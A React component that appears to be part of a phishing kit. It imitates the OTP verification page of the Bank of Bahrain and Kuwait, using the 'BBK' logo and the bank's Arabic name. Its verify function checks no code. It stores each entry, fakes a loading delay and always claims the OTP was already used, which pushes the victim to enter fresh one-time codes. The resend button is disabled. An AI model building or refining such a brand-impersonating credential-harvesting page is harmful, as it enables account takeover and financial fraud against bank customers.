import React, { useState, useEffect, useRef } from "react";

export default function Lastotp() {
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [loading, setLoading] = useState(false);
  const [otpMsg, setOtpMsg] = useState(""); // For repeated OTP message
  const [showError, setShowError] = useState(false);
  const [resendTimer, setResendTimer] = useState(60);
  const timerRef = useRef(null);
  const inputsRef = useRef([]);

  // Auto-focus first input on mount
  useEffect(() => {
    inputsRef.current[0]?.focus();
    startResendTimer();
  }, []);

  // Resend timer logic
  const startResendTimer = () => {
    setResendTimer(60);
    if (timerRef.current) clearInterval(timerRef.current);
    timerRef.current = setInterval(() => {
      setResendTimer((prev) => {
        if (prev <= 1) {
          clearInterval(timerRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  // Handle input change
  const handleChange = (e, index) => {
    const value = e.target.value.replace(/\D/g, "");
    const newOtp = [...otp];
    newOtp[index] = value;
    setOtp(newOtp);

    if (value && index < 5) {
      inputsRef.current[index + 1].focus();
    }
  };

  // Handle backspace
  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const newOtp = [...otp];
      newOtp[index - 1] = "";
      setOtp(newOtp);
      inputsRef.current[index - 1].focus();
    }
    if (e.key === "Enter") verifyOTP();
  };

  // Handle paste
  const handlePaste = (e) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    const newOtp = [...otp];
    pasted.split("").forEach((digit, i) => {
      newOtp[i] = digit;
    });
    setOtp(newOtp);
    if (pasted.length < 6) inputsRef.current[pasted.length]?.focus();
  };

  // Verify OTP
// Verify OTP
const verifyOTP = () => {
  const currentOtp = otp.join("");

  // Empty or incomplete OTP
  if (currentOtp.length !== 6) {
    setOtpMsg("Please enter a valid 6-digit OTP");
    return;
  }

  const previousOtp = sessionStorage.getItem("lastOtp");

  // Same OTP again
  if (currentOtp === previousOtp) {
    setOtpMsg("You have already entered the same OTP, please enter a new OTP");
    return;
  }

  // Save OTP
  sessionStorage.setItem("lastOtp", currentOtp);
  setOtpMsg(""); // Clear message
  setLoading(true);

  // Simulating OTP verify request (no alert now)
  setTimeout(() => {
    setLoading(false);
    setOtpMsg("You have already entered the same OTP, please enter a new OTP");  // Just show message
  }, 1500);
};


  // Resend OTP
  const resendOTP = () => {
    alert("OTP has been resent to your registered mobile number");
    setOtp(["", "", "", "", "", ""]);
    inputsRef.current[0].focus();
    startResendTimer();
  };

  const closeErrorModal = () => {
    setShowError(false);
    setOtp(["", "", "", "", "", ""]);
    inputsRef.current[0].focus();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] flex flex-col items-center px-4 py-12 text-white">
      {/* Logo */}
      <div className="w-full flex justify-end mb-16">
        <div className="flex flex-col items-center text-center">
          <div className="relative text-3xl font-bold tracking-wide mb-1">
            BBK
            <span className="absolute -top-1 -right-4 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-10">
        <h1 className="text-2xl font-light mb-2">OTP Verification</h1>
        <p className="text-sm opacity-80">
          We've sent a 6-digit verification code to your registered mobile number
        </p>
      </div>

      {/* Repeated OTP Message */}
      {otpMsg && (
        <p className="text-red-500 text-sm text-center mb-3">{otpMsg}</p>
      )}

      {/* OTP Inputs */}
      <div className="flex gap-3 mb-6">
        {otp.map((value, idx) => (
          <input
            key={idx}
            type="tel"
            maxLength="1"
            value={value}
            onChange={(e) => handleChange(e, idx)}
            onKeyDown={(e) => handleKeyDown(e, idx)}
            onPaste={handlePaste}
            ref={(el) => (inputsRef.current[idx] = el)}
            className={`w-10 h-12 sm:w-14 sm:h-16 text-center text-xl sm:text-2xl rounded-lg border-2 border-white/30 bg-transparent focus:border-white outline-none ${
              value ? "border-white/80 bg-white/10" : ""
            }`}
          />
        ))}
      </div>

      {/* Resend */}
      <div className="text-center mb-6">
        <p className="text-xs opacity-70 mb-1">Didn't receive the code?</p>
        <button
        //   onClick={resendOTP}
          disabled={resendTimer > 0}
          className={`text-sm underline ${resendTimer > 0 ? "opacity-50 cursor-not-allowed" : "opacity-90"}`}
        >
          Resend OTP
        </button>
        {resendTimer > 0 && <p className="text-xs opacity-70 mt-1">Resend available in {resendTimer}s</p>}
      </div>

      {/* Verify Button */}
      <button
        onClick={verifyOTP}
        disabled={loading}
        className={`w-full py-4 rounded-full text-lg font-medium transition ${
          loading ? "bg-white/30 cursor-not-allowed" : "bg-white/20 hover:bg-white/30"
        }`}
      >
        {loading ? "Verifying..." : "Verify"}
      </button>

      {/* Back Button */}
      <div className="text-center mt-6">
        <button className="text-sm text-white/90 hover:text-white underline">← Back to Login</button>
      </div>

      {/* Error Modal */}
      {showError && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-white rounded-xl p-6 w-11/12 max-w-sm text-center">
            <div className="text-4xl mb-3 text-red-500">⚠️</div>
            <div className="text-lg font-semibold text-gray-800 mb-2">Invalid OTP</div>
            <div className="text-gray-600 mb-4">
              The OTP you entered is incorrect. Please try again with the correct code.
            </div>
            <button
              onClick={closeErrorModal}
              className="bg-red-500 text-white px-6 py-2 rounded-full hover:bg-red-600 transition"
            >
              Try Again
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
